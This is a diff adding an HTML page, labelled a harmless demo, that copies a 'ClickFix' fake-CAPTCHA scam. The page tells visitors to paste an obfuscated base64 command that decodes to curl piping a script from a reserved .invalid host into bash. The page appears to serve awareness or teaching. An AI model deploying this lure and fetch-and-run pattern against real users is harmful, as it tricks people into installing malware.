@@ -1,0 +1,33 @@
+<!doctype html>
+<!--
+  DEMO ONLY: a copy of a "ClickFix" fake-CAPTCHA scam, made harmless.
+  The hidden command decodes to: curl -s https://verify-captcha.invalid/check.sh | bash
+  ".invalid" is a reserved name that can never exist, so even if it were run, nothing would download.
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Just a moment... Verify you are human</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="verify-human.css">
+</head>
+<body>
+  <div class="box">
+    <h2>Verify you are human</h2>
+    <p class="sub">cloud-guard needs to review the security of your connection before proceeding.</p>
+    <label class="captcha" id="captcha"><input type="checkbox" id="check"> I'm not a robot</label>
+    <div class="steps" id="steps" hidden>
+      <b>Verification steps</b>
+      <ol>
+        <li>Press <kbd>⌘ Command</kbd> + <kbd>Space</kbd>, type <b>Terminal</b> and press Return</li>
+        <li>Press <kbd>⌘ Command</kbd> + <kbd>V</kbd> to paste the verification code</li>
+        <li>Press <kbd>Return</kbd> to finish verification</li>
+      </ol>
+      <p class="code-label">Verification code (already copied):</p>
+      <pre id="code">echo "Y3VybCAtcyBodHRwczovL3ZlcmlmeS1jYXB0Y2hhLmludmFsaWQvY2hlY2suc2ggfCBiYXNo" | base64 -d | bash</pre>
+    </div>
+    <p class="ray">Ray ID: 8f3a91c2d7e0 · Performance &amp; security by cloud-guard</p>
+  </div>
+  <script src="verify-human.js"></script>
+</body>
+</html>
